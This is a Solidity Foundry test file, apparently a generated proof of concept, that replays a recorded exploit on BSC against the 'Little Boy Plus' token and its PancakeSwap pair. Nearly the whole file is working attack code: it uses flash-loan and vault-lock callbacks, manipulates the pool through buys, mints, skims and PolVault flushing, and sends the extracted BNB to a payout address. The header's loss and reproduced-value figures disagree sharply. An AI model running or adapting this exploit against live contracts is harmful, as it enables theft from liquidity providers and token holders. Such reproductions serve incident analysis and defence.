// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : 534.31 USD
// Attacker : 0xb26dfe6b6180a30e2a2d9826867cc7e06631825a
// Attack Contract : 0x202ba7498c65f9f5c49b9c90953b562f9e0538fb
// Vulnerable Contract : N/A
// Attack Tx : 0x55856d9fda4c5be5193561c7d775e823c3d6e499da44aab9da963daf61c50b0c
// Block : 104727184
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : beneficial_payout_reproduction
// Reproduced Value : 364.49K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 104727183;
    uint256 constant TX_TIMESTAMP = 1781685338;
    uint256 constant TX_BLOCK_NUMBER = 104727184;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        AttackContract attack = _prepareAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _prepareAttack() internal returns (AttackContract attack) {
        _etchAttackRuntime();
        attack = AttackContract(payable(ATTACK_CONTRACT));
        _etchChildRuntime();
        _bindAttackChild(attack);
    }

    function _prepareProfit(AttackContract attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(AttackContract attack) internal pure returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(AttackContract).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchChildRuntime() internal {
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _bindAttackChild(AttackContract attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_515788_6D1A, address(0), Addresses.ZERO, "BNB", 605555786330933864102);
        _expectProfit(Addresses.attack_child, attackChild, Addresses.Cake_LP, "Cake-LP", 23218051024950574782538);
        _expectProfit(
            Addresses.attack_child, attackChild, Addresses.Little_Boy_Plus, "Little Boy Plus", 3881277202880720
        );
    }
}

contract AttackContract {
    AttackChild public attackChild;

    constructor() payable {
        _bindAttackChild();
    }

    function _bindAttackChild() internal {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(Addresses.attack_child));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _bindAttackChild();
        return address(attackChild);
    }

    function attack() external payable {
        _runAttack();
    }

    function executeSetup() external payable {
        _runAttack();
    }

    function _runAttack() internal {
        if (address(attackChild) == address(0)) _bindAttackChild();
        executeAttackFlow();
    }

    function executeAttackFlow() public {
        requireChildRuntime();
        startChildFlow();
    }

    function requireChildRuntime() internal {
        address child = address(attackChild);
        require(child.code.length != 0, "attack child runtime missing");
        AttackChild(payable(child)).assertChildReady();
    }

    function startChildFlow() internal {
        AttackChild(payable(address(attackChild))).flashLoanCallback();
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        _acceptCallback();
    }

    function _acceptCallback() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(Addresses.attack_child));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }
}

contract AttackChild {
    receive() external payable {}

    function onMoolahFlashLoan(uint256 amount, bytes calldata callbackData) external payable {
        amount;
        callbackData;
        if (!_callbackDone[MOOLAH_CALLBACK_DONE]) flashCallback2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function lockAcquired(bytes calldata lockData) external payable {
        lockData;
        if (!_callbackDone[VAULT_LOCK_DONE]) _vaultLockFlow();
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x5258a367) {
            _startMoolahLoan();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _acceptCallback();
    }

    function flashCallback() external payable {
        if (!_callbackDone[MOOLAH_CALLBACK_DONE]) flashCallback2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback() external payable {
        _startMoolahLoan();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function callback() external payable {
        if (!_callbackDone[VAULT_LOCK_DONE]) _vaultLockFlow();
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function _acceptCallback() internal {}

    bytes32 private constant MOOLAH_CALLBACK_DONE = keccak256("poc.callback.moolah");
    bytes32 private constant VAULT_LOCK_DONE = keccak256("poc.callback.vault");
    mapping(bytes32 => bool) private _callbackDone;

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function flashCallback2() internal {
        _callbackDone[MOOLAH_CALLBACK_DONE] = true;
        flashCallback3();
    }

    function flashCallback3() internal {
        IVault_238A35(Addresses.Vault_238A35)
            .lock(hex"0000000000000000000000000000000000000000000000000000000000000000");
    }

    function _startMoolahLoan() internal {
        _readLenderWbnb();
        _readLenderUsdt();
        _readVaultUsdt();
        _approveWbnbLender();
        _approveUsdtLender();
        _borrowUsdt();
        _readOwnUsdt();
        _quoteUsdtToWbnb();
        _fundWbnbPair();
        _swapUsdtToWbnb();
        _withdrawWbnb();
        _sendNativeDust();
        _collectNativeGain();
    }

    function _readLenderWbnb() internal view {
        IERC20Like(Addresses.WBNB).balanceOf(Addresses.A_8F73B6_5D8C);
    }

    function _readLenderUsdt() internal view {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.A_8F73B6_5D8C);
    }

    function _readVaultUsdt() internal view {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Vault_238A35);
    }

    function _approveWbnbLender() internal {
        IERC20Like(Addresses.WBNB).approve(Addresses.A_8F73B6_5D8C, type(uint256).max);
    }

    function _approveUsdtLender() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.A_8F73B6_5D8C, type(uint256).max);
    }

    function _borrowUsdt() internal {
        bytes memory flashLoanData = abi.encode(address(0));
        IMoolahFlashLender(Addresses.A_8F73B6_5D8C).flashLoan(Addresses.USDT, 7772960679833989887601242, flashLoanData);
    }

    function _readOwnUsdt() internal view {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function _quoteUsdtToWbnb() internal view {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(377642570849956957317599, _addressArray2(Addresses.USDT, Addresses.WBNB));
    }

    function _fundWbnbPair() internal {
        uint256 usdtTransferAmount = 377642570849956957317599;
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_0DAE, usdtTransferAmount);
    }

    function _swapUsdtToWbnb() internal {
        IUniswapV2PairLike(Addresses.Cake_LP_0DAE).swap(0, 610555786330933864102, address(this), hex"");
    }

    function _withdrawWbnb() internal {
        uint256 withdrawAmount = 610555786330933864102;
        IWBNB(Addresses.WBNB).withdraw(withdrawAmount);
    }

    function _sendNativeDust() internal {
        (bool ok,) = payable(Addresses.A_484848_4848).call{value: 5000000000000000000}("");
        if (!ok) {}
    }

    function _collectNativeGain() internal {
        uint256 nativeTransferAmount = address(this).balance;
        if (nativeTransferAmount > 605555786330933864102) nativeTransferAmount = 605555786330933864102;
        (bool ok,) = payable(Addresses.A_515788_6D1A).call{value: nativeTransferAmount}("");
        if (!ok) {}
    }

    function _vaultLockFlow() internal {
        _callbackDone[VAULT_LOCK_DONE] = true;
        _readVaultUsdt();
        _vaultTakeUsdt();
        _quoteInitialBuy();
        _fundPairBuy1();
        _swapBuy1();
        _readPairReserves1();
        _readLbpBalance1();
        _fundLbpPair1();
        _fundUsdtPair2();
        _mintPairLp1();
        _flushPolVault();
        _bindReferral();
        _fundPairBuy2();
        _swapBuy2();
        _quoteLargeBuy();
        _fundPairBuy3();
        _swapBuy3();
        _readPairReserves2();
        _readPairLbp1();
        _readPairLbp2();
        _returnLbpToPair();
        _fundPairMint2();
        _skimPair();
        _mintPairLp2();
        _zeroLbpTransfer();
        _burnHlbpDust();
        _readLbpBalance2();
        _sendLbpToPair();
        _readPairReserves3();
        _readPairLbp3();
        _quoteLbpToUsdt();
        _swapLbpToUsdt();
        _syncVaultUsdt();
        _repayVaultUsdt();
        _settleVault();
    }

    function _vaultTakeUsdt() internal {
        uint256 takeAmount = 34088143961844099311594944;
        IVault_238A35(Addresses.Vault_238A35).take(Addresses.USDT, address(this), takeAmount);
    }

    function _quoteInitialBuy() internal view {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(1000000000000000000000, _addressArray2(Addresses.USDT, Addresses.Little_Boy_Plus));
    }

    function _fundPairBuy1() internal {
        uint256 usdtTransferAmount = 1000000000000000000000;
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, usdtTransferAmount);
    }

    function _swapBuy1() internal {
        IUniswapV2PairLike(Addresses.Cake_LP).swap(0, 24339781623011675529, address(this), hex"");
    }

    function _readPairReserves1() internal view {
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readLbpBalance1() internal view {
        IERC20Like(Addresses.Little_Boy_Plus).balanceOf(address(this));
    }

    function _fundLbpPair1() internal {
        uint256 littleBoyPlusAmount = 24096383806781558774;
        IERC20Like(Addresses.Little_Boy_Plus).transfer(Addresses.Cake_LP, littleBoyPlusAmount);
    }

    function _fundUsdtPair2() internal {
        uint256 usdtTransferAmount = 999770329154540264768;
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, usdtTransferAmount);
    }

    function _mintPairLp1() internal {
        ICake_LP(Addresses.Cake_LP).mint(Addresses.Cake_LP);
    }

    function _flushPolVault() internal {
        IPolVault(Addresses.PolVault).flushPol();
    }

    function _bindReferral() internal {
        IhLBP(Addresses.hLBP).bindReferral(Addresses.A_51EDEA_5CC2);
    }

    function _fundPairBuy2() internal {
        uint256 usdtTransferAmount = 1000000000000000000;
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, usdtTransferAmount);
    }

    function _swapBuy2() internal {
        IUniswapV2PairLike(Addresses.Cake_LP).swap(0, 1100000000000000, address(this), hex"");
    }

    function _quoteLargeBuy() internal view {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(15000000000000000000000000, _addressArray2(Addresses.USDT, Addresses.Little_Boy_Plus));
    }

    function _fundPairBuy3() internal {
        uint256 usdtTransferAmount = 15000000000000000000000000;
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, usdtTransferAmount);
    }

    function _swapBuy3() internal {
        IUniswapV2PairLike(Addresses.Cake_LP).swap(0, 10436185642129257030800, address(this), hex"");
    }

    function _readPairReserves2() internal view {
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readPairLbp1() internal view {
        IERC20Like(Addresses.Little_Boy_Plus).balanceOf(Addresses.Cake_LP);
    }

    function _readPairLbp2() internal view {
        IERC20Like(Addresses.Little_Boy_Plus).balanceOf(Addresses.Cake_LP);
    }

    function _returnLbpToPair() internal {
        uint256 littleBoyPlusAmount = 115442628800700239012;
        IERC20Like(Addresses.Little_Boy_Plus).transfer(Addresses.Cake_LP, littleBoyPlusAmount);
    }

    function _fundPairMint2() internal {
        uint256 usdtTransferAmount = 5790511652692109497206178;
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, usdtTransferAmount);
    }

    function _skimPair() internal {
        ICake_LP(Addresses.Cake_LP).skim(Addresses.Cake_LP);
    }

    function _mintPairLp2() internal {
        ICake_LP(Addresses.Cake_LP).mint(address(this));
    }

    function _zeroLbpTransfer() internal {
        IERC20Like(Addresses.Little_Boy_Plus).transfer(address(this), 0);
    }

    function _burnHlbpDust() internal {
        IERC20Like(Addresses.hLBP).transferFrom(Addresses.Cake_LP, Addresses.A_000000_DEAD, 0);
    }

    function _readLbpBalance2() internal view {
        IERC20Like(Addresses.Little_Boy_Plus).balanceOf(address(this));
    }

    function _sendLbpToPair() internal {
        uint256 littleBoyPlusAmount = 33234936188192519257374;
        IERC20Like(Addresses.Little_Boy_Plus).transfer(Addresses.Cake_LP, littleBoyPlusAmount);
    }

    function _readPairReserves3() internal view {
        ICake_LP(Addresses.Cake_LP).getReserves();
    }

    function _readPairLbp3() internal view {
        IERC20Like(Addresses.Little_Boy_Plus).balanceOf(Addresses.Cake_LP);
    }

    function _quoteLbpToUsdt() internal view {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(141680718661980290585373, _addressArray2(Addresses.Little_Boy_Plus, Addresses.USDT));
    }

    function _swapLbpToUsdt() internal {
        IUniswapV2PairLike(Addresses.Cake_LP).swap(21170154993871220994788545, 0, address(this), hex"");
    }

    function _syncVaultUsdt() internal {
        IVault_238A35(Addresses.Vault_238A35).sync(Addresses.USDT);
    }

    function _repayVaultUsdt() internal {
        uint256 usdtRepaymentAmount = 34088143961844099311594944;
        IERC20Like(Addresses.USDT).transfer(Addresses.Vault_238A35, usdtRepaymentAmount);
    }

    function _settleVault() internal {
        IVault_238A35(Addresses.Vault_238A35).settle();
    }

    function assertChildReady() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant Cake_LP = 0x00e3Ea08fD8CBaD955Ec5d2292Ad637670c31524;
    address internal constant PolVault = 0x01c87119a0D1C3730534b8d909eFeB1911b9fdB0;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant Cake_LP_0DAE = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant attack_contract = 0x202bA7498C65F9F5C49b9c90953B562F9e0538FB;
    address internal constant Vault_238A35 = 0x238a358808379702088667322f80aC48bAd5e6c4;
    address internal constant A_484848_4848 = 0x4848489f0b2BEdd788c696e2D79b6b69D7484848;
    address internal constant A_515788_6D1A = 0x515788797914Cb663114aEb806B3CFb6096F6D1A;
    address internal constant A_51EDEA_5CC2 = 0x51EDEAb1CEa55570b246b3A1E42DAba9027c5cc2;
    address internal constant attack_child = 0x5449ded887576f43Fc339851e942eBc1E6F8118b;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant hLBP = 0x5E3cBc82D020be91a989Eb747934104E9AB585Fe;
    address internal constant Little_Boy_Plus = 0x88886f0fD371dfF856291bAdcEd45922bC888888;
    address internal constant A_8F73B6_5D8C = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address internal constant attacker_eoa = 0xb26DFE6b6180A30e2A2D9826867cc7e06631825a;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
}

interface ICake_LP {
    function getReserves() external view;
    function mint(address) external returns (uint256);
    function skim(address) external;
}

interface IMoolahFlashLender {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IPancakeRouter {
    function getAmountsOut(uint256, address[] calldata) external view;
}

interface IPolVault {
    function flushPol() external returns (uint256);
}

interface IVault_238A35 {
    function lock(bytes calldata) external;
    function settle() external returns (uint256);
    function sync(address) external;
    function take(address, address, uint256) external;
    function sync() external;
}

interface IWBNB {
    function withdraw(uint256) external;
}

interface IhLBP {
    function bindReferral(address) external;
}
